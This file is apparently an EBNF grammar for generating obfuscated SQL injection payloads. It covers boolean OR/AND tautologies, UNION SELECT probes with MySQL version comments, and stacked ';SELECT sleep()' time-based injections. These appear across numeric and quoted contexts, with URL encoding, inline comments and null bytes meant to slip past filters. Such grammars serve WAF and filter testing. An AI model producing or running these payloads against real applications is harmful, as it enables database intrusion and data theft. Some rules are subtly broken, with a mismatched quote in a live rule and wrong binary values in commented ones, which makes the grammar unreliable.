terSQuote = "'" | "%27" ;
terDQuote = "\"" | "%22" ;
terDigitZero = "0" | "%30" | wsp, "0b0" | "0x0" ;
terDigitOne = "1" | "%31" | wsp, "0b1" | "0x1" ;
terDigitTwo = "2" | "%32" | wsp, "0b10" | "0x2" ;
terDigitThree = "3" | "%33" | wsp, "0b11" | "0x3" ;
terDigitFour = "4" | "%34" | wsp, "0b100" | "0x4" ;
terDigitFive = "5" | "%35" | wsp, "0b101" | "0x5" ;
terDigitSix = "6" | "%36" | wsp, "0b110" | "0x6" ;
terDigitSeven = "7" | "%37" | wsp, "0b111" | "0x7" ;
terDigitEight = "8" | "%38" | wsp, "0b1000" | "0x8" ;
terDigitNine = "9" | "%39" | wsp, "0b1001" | "0x9" ;
terDigitExcludingZero = terDigitOne | terDigitTwo | terDigitThree | terDigitFour | terDigitFive | terDigitSix | terDigitSeven | terDigitEight | terDigitNine ;
#terDigitIncludingZero = terDigitZero | terDigitExcludingZero ;

# some of these aren't referenced in the grammar
# I'm commenting them to make analysis easier
terCharA = "a" | "%61" | "A" | "%41";
terCharB = "b" | "%62" | "B" | "%42";
terCharC = "c" | "%63" | "C" | "%43";
terCharD = "d" | "%64" | "D" | "%44";
terCharE = "e" | "%65" | "E" | "%45";
terCharF = "f" | "%66" | "F" | "%46";
#terCharG = "g" | "%67" | "G" | "%47";
terCharH = "h" | "%68" | "H" | "%48";
terCharI = "i" | "%69" | "I" | "%49";
#terCharJ = "j" | "%6A" | "J" | "%4A";
terCharK = "k" | "%6B" | "K" | "%4B";
terCharL = "l" | "%6C" | "L" | "%4C";
#terCharM = "m" | "%6D" | "M" | "%4D";
terCharN = "n" | "%6E" | "N" | "%4E";
terCharO = "o" | "%6F" | "O" | "%4F";
#terCharP = "p" | "%70" | "P" | "%50";
#terCharQ = "q" | "%71" | "Q" | "%51";
terCharR = "r" | "%72" | "R" | "%52";
terCharS = "s" | "%73" | "S" | "%53";
terCharT = "t" | "%74" | "T" | "%54";
terCharU = "u" | "%75" | "U" | "%55";
#terCharV = "v" | "%76" | "V" | "%56";
#terCharW = "w" | "%77" | "W" | "%57";
#terCharX = "x" | "%78" | "X" | "%58";
terCharY = "y" | "%79" | "Y" | "%59";
terCharZ = "z" | "%7A" | "Z" | "%5A";

terCharAValue = terSQuote, terCharA, terSQuote | wsp, "0x61" | wsp, "x", terSQuote, "61", terSQuote | wsp, "0b1100001" | wsp,  opChar, parOpen, "97", par;
terCharBValue = terSQuote, terCharB, terSQuote | wsp, "0x62" | wsp, "x", terSQuote, "62", terSQuote | wsp, "0b1100010" | wsp, opChar, parOpen, "98", par;
terCharCValue = terSQuote, terCharC, terSQuote | wsp, "0x63" | wsp, "x", terSQuote, "63", terSQuote | wsp, "0b1100011" | wsp, opChar, parOpen, "99", par;
terCharDValue = terSQuote, terCharD, terSQuote | wsp, "0x64" | wsp, "x", terSQuote, "64", terSQuote | wsp, "0b1100100" | wsp, opChar, parOpen, "100", par;
terCharEValue = terSQuote, terCharE, terSQuote | wsp, "0x65" | wsp, "x", terSQuote, "65", terSQuote | wsp, "0b1100101" | wsp, opChar, parOpen, "101", par;
#terCharFValue = terSQuote, terCharF, terSQuote | wsp, "0x66" | wsp, "x", terSQuote, "66", terSQuote | wsp, "0b1100110" | wsp, opChar, parOpen, "102", par;
#terCharGValue = terSQuote, terCharG, terSQuote | wsp, "0x67" | wsp, "x", terSQuote, "67", terSQuote | wsp, "0b1100111" | wsp, opChar, parOpen, "103", par;
#terCharHValue = terSQuote, terCharH, terSQuote | wsp, "0x68" | wsp, "x", terSQuote, "68", terSQuote | wsp, "0b1101000" | wsp, opChar, parOpen, "104", par;
#terCharIValue = terSQuote, terCharI, terSQuote | wsp, "0x69" | wsp, "x", terSQuote, "69", terSQuote | wsp, "0b1101001" | wsp, opChar, parOpen, "105", par;
#terCharJValue = terSQuote, terCharJ, terSQuote | wsp, "0x6A" | wsp, "x", terSQuote, "6A", terSQuote | wsp, "0b1101010" | wsp, opChar, parOpen, "106", par;
#terCharKValue = terSQuote, terCharK, terSQuote | wsp, "0x6B" | wsp, "x", terSQuote, "6B", terSQuote | wsp, "0b1101011" | wsp, opChar, parOpen, "107", par;
#terCharLValue = terSQuote, terCharL, terSQuote | wsp, "0x6C" | wsp, "x", terSQuote, "6C", terSQuote | wsp, "0b1101100" | wsp, opChar, parOpen, "108", par;
#terCharMValue = terSQuote, terCharO, terSQuote | wsp, "0x6D" | wsp, "x", terSQuote, "6D", terSQuote | wsp, "0b1101101" | wsp, opChar, parOpen, "109", par;
#terCharNValue = terSQuote, terCharM, terSQuote | wsp, "0x6E" | wsp, "x", terSQuote, "6E", terSQuote | wsp, "0b1101110" | wsp, opChar, parOpen, "110", par;
#terCharOValue = terSQuote, terCharN, terSQuote | wsp, "0x6F" | wsp, "x", terSQuote, "6F", terSQuote | wsp, "0b1101111" | wsp, opChar, parOpen, '111", par;
#terCharPValue = terSQuote, terCharP, terSQuote | wsp, "0x70" | wsp, "x", terSQuote, "70", terSQuote | wsp, "0b1110000" | wsp, opChar, parOpen, "112", par;
#terCharQValue = terSQuote, terCharQ, terSQuote | wsp, "0x71" | wsp, "x", terSQuote, "71", terSQuote | wsp, "0b1110001" | wsp, opChar, parOpen, "113", par;
#terCharRValue = terSQuote, terCharR, terSQuote | wsp, "0x72" | wsp, "x", terSQuote, "72", terSQuote | wsp, "0b1110011" | wsp, opChar, parOpen, "114", par;
#terCharSValue = terSQuote, terCharS, terSQuote | wsp, "0x73" | wsp, "x", terSQuote, "73", terSQuote | wsp, "0b1110100" | wsp, opChar, parOpen, "115", par;
#terCharTValue = terSQuote, terCharT, terSQuote | wsp, "0x74" | wsp, "x", terSQuote, "74", terSQuote | wsp, "0b1110101" | wsp, opChar, parOpen, "116", par;
#terCharUValue = terSQuote, terCharU, terSQuote | wsp, "0x75" | wsp, "x", terSQuote, "75", terSQuote | wsp, "0b1110110" | wsp, opChar, parOpen, "117", par;
#terCharVValue = terSQuote, terCharV, terSQuote | wsp, "0x76" | wsp, "x", terSQuote, "76", terSQuote | wsp, "0b1110110" | wsp, opChar, parOpen, "118", par;
#terCharWValue = terSQuote, terCharW, terSQuote | wsp, "0x77" | wsp, "x", terSQuote, "77", terSQuote | wsp, "0b1110111" | wsp, opChar, parOpen, "119", par;
#terCharXValue = terSQuote, terCharX, terSQuote | wsp, "0x78" | wsp, "x", terSQuote, "78", terSQuote | wsp, "0b1111000" | wsp, opChar, parOpen, "120", par;
terCharYValue = terSQuote, terCharY, terSQuote | wsp, "0x79" | wsp, "x", terSQuote, "79", terSQuote | wsp, "0b1111001" | wsp, opChar, parOpen, '121", par;
terCharZValue = terSQuote, terCharZ, terSQuote | wsp, "0x7A" | wsp, "x", terSQuote, "7A", terSQuote | wsp, "0b1111010" | wsp, opChar, parOpen, "122", par;

terCharSmallVal = terCharAValue | terCharBValue | terCharCValue | terCharDValue | terCharEValue ;
terCharLargeVal = terCharYValue | terCharZValue ;
terDigitSmallVal = terDigitZero | terDigitOne | terDigitTwo | terDigitThree | terDigitFour ;
terDigitLargeVal = terDigitFive | terDigitSix | terDigitSeven | terDigitEight | terDigitNine ;

#terChar = terCharA | terCharB | terCharC | terCharD | terCharE | terCharF | terCharG | terCharH | terCharI | terCharJ | terCharK | terCharL | terCharM | terCharN | terCharO | terCharP | terCharQ | terCharR | terCharS | terCharT | terCharU | terCharV | terCharW | terCharX | terCharY | terCharZ ;
#terCharNoQuote = opChar, parOpen, "97", par | "0x61" ; 
terNull = "%00" ;

# SQL Operators and Keyword
opNot = "!" | "%21" | terCharN, terCharO, terCharT ;
opBinInvert = "~" | "%7E" ;
opEqual = "=" | "%3D" ;
opLt = "<" | "%3C" ;
opGt = ">" | "%3E" ;
opLike = terCharL, terCharI, terCharK, terCharE ;
opIs = terCharI, terCharS ;
opMinus = "-" | "%2D";
opOr = terCharO, [inlineCmt], terCharR | "||" | "%7C%7C";
opAnd = terCharA, terCharN, terCharD | "&&" | "%26%26";
opSel = terCharS, terCharE, terCharL, terCharE, terCharC, terCharT ;
opUni = terCharU, terCharN, terCharI, terCharO, terCharN ;
opSem = ";" | "%3B" ;
#opConcat = "concat" ;
opChar = terCharC, terCharH, terCharA, terCharR ;

# SQL functions
parOpen = "(" | "%28" ;
funcSleep = "sleep" , parOpen , terDigitExcludingZero , par ;

# Syntax-repairing
par = ")" | "%29" ;
cmt = "#" | "--", blank | "%23"

# Obfuscation
inlineCmt = "/**/" ;
blank = " " | "%20" ;
wsp = blank | inlineCmt ;

### Boolean-based Attacks ### 

# boolean values which evaluate to true
trueConst = terCharT, terCharR, terCharU, terCharE ;
# trueConst = "true" ; 
trueAtom = trueConst | terDigitOne ;
unaryTrue = wsp, trueAtom | wsp, opNot, wsp, falseAtom | opBinInvert, wsp, falseAtom | wsp, opNot, wsp, opBinInvert, trueAtom ;
bT1 = unaryTrue, opEqual, wsp, parOpen, unaryTrue, par ;
bT2 = unaryFalse, opEqual, wsp, parOpen, unaryFalse, par ;
bT3 = terSQuote, terCharA, terSQuote, opEqual, terSQuote, terCharA, terSQuote ;
bT4 = terDQuote, terCharA, terDQuote, opEqual, terDQuote, terCharA, terDQuote ;
bT5 = unaryFalse, opLt, parOpen, unaryTrue, par ;
bT6 = unaryTrue, opGt, parOpen, unaryFalse, par ;
bT7 = wsp, trueAtom, wsp, opLike, wsp, trueAtom ;
bT8 = unaryTrue, wsp, opIs, wsp, trueConst ;
bT9 = unaryFalse, wsp, opIs, wsp, falseConst ;
bT10 = unaryTrue, opMinus, parOpen, unaryFalse, par ;
bT11 = terCharSmallVal, wsp, opLt, wsp, terCharLargeVal ;
bT12 = terCharLargeVal, wsp, opGt, wsp, terCharSmallVal ;
bT13 = terDigitSmallVal, wsp, opLt, wsp, terDigitLargeVal ;
bT14 = terDigitLargeVal, wsp, opGt, wsp, terDigitSmallVal ;
binaryTrue = bT1 | bT2 | bT3 | bT4 | bT5 | bT6 | bT7 | bT8 | bT9 | bT10 | bT11 | bT12 | bT13 | bT14 ;  
booleanTrueExpr = unaryTrue | binaryTrue ;

# boolean values which evaluate to false
falseConst = terCharF, terCharA, terCharL, terCharS, terCharE ;
# falseConst = "false" ;
falseAtom = wsp, falseConst |  wsp, terDigitZero | terSQuote, terSQuote ;
unaryFalse = falseAtom | wsp, opNot, wsp, trueAtom | wsp, opNot, opBinInvert, falseAtom | wsp, opBinInvert, trueAtom ;
bF1 = terSQuote, terCharA, terSQuote, opEqual, terSQuote, terCharB, terSQuote ;
bF2 = terCharSmallVal, wsp, opGt, wsp, terCharLargeVal ;
bF3 = terCharLargeVal, wsp, opLt, wsp, terCharSmallVal ;
bF4 = terDigitSmallVal, wsp, opGt, wsp, terDigitLargeVal ;
bF5 = terDigitLargeVal, wsp, opLt, wsp, terDigitSmallVal ;
bF6 = unaryTrue, opLt, parOpen, unaryFalse, par ;
binaryFalse = bF1 | bF2 | bF3 | bF4 | bF5 | bF6 ;
booleanFalseExpr = unaryFalse | binaryFalse;

orAttack = opOr, booleanTrueExpr ;
andAttack = opAnd, booleanFalseExpr ;
booleanAttack = orAttack | andAttack ;

### Union Attacks ###
cols = terDigitZero ;
unionPostfix = "all", wsp | "distinct", wsp ;
union = opUni | "/*!", ["50000"], opUni, "*/" ;
unionAttack = union, wsp, [unionPostfix], opSel, wsp, cols | union, wsp, [unionPostfix] , parOpen, opSel, wsp, cols,par ;

### Piggy-backed Attacks ###
piggyAttack = opSem, opSel, wsp, funcSleep ;

### Injection Context ###
sqliAttack = unionAttack | piggyAttack | booleanAttack ;

numericContext = [terNull], terDigitZero, wsp, booleanAttack, wsp | [terNull], terDigitZero, par, wsp, booleanAttack, wsp, opOr, parOpen, terDigitZero | [terNull], terDigitZero, [par], wsp, sqliAttack, cmt ;
sQuoteContext = [terNull], terSQuote, wsp, booleanAttack, wsp, opOr, terSQuote | [terNull], terSQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terSQuote | [terNull], terSQuote, [par], wsp, sqliAttack, cmt ;
dQuoteContext = [terNull], terDQuote, wsp, booleanAttack, wsp, opOr, terDQuote | [terNull], terDQuote, par, wsp, booleanAttack, wsp, opOr, parOpen, terDQuote | [terNull], terDQuote, [par], wsp, sqliAttack, cmt ;

start = numericContext | sQuoteContext | dQuoteContext ;
